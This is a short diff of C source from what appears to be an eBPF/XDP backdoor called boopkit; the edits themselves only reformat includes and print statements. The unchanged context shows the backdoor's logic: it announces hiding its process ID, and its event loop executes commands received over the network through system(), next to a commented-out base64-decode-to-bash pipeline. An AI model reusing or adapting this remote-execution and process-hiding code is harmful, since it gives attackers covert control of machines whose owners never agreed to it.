@@ -31,13 +31,13 @@
 #include <limits.h>
 #include <linux/types.h>
 #include <net/if.h>
+#include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
 #include <xdp/libxdp.h>  // libxdp
-#include <pthread.h>
 
 // clang-format off
 #include "boopkit.h"
@@ -216,9 +216,11 @@ void rootcheck(int argc, char **argv) {
 int main(int argc, char **argv) {
   clisetup(argc, argv);
   asciiheader();
-  boopprintf("====================================================================\n");
+  boopprintf(
+      "====================================================================\n");
   rootcheck(argc, argv);
-  boopprintf("  -> Logs                    : cat /sys/kernel/tracing/trace_pipe\n");
+  boopprintf(
+      "  -> Logs                    : cat /sys/kernel/tracing/trace_pipe\n");
 
   int loaded, err;
   struct bpf_object *bpobj;
@@ -343,7 +345,8 @@ int main(int argc, char **argv) {
     boopprintf("  XX Deny address            : %s\n", cfg.deny[i]);
   }
   boopprintf("  -> Obfuscating PID         : %s\n", pid);
-  boopprintf("====================================================================\n");
+  boopprintf(
+      "====================================================================\n");
 
   // ===========================================================================
   // Boopkit event loop
@@ -408,8 +411,9 @@ int main(int argc, char **argv) {
           int retval;
           retval = xcaprce(saddrval, rce);
           if (retval == 0) {
-            //char rce_base64_cmd_str[4096];
-            //sprintf(rce_base64_cmd_str, "echo \"%s\" | base64 -d | /bin/bash", rce);
+            // char rce_base64_cmd_str[4096];
+            // sprintf(rce_base64_cmd_str, "echo \"%s\" | base64 -d |
+            // /bin/bash", rce);
             boopprintf("  <- Executing: %s\n", rce);
             system(rce);
           }
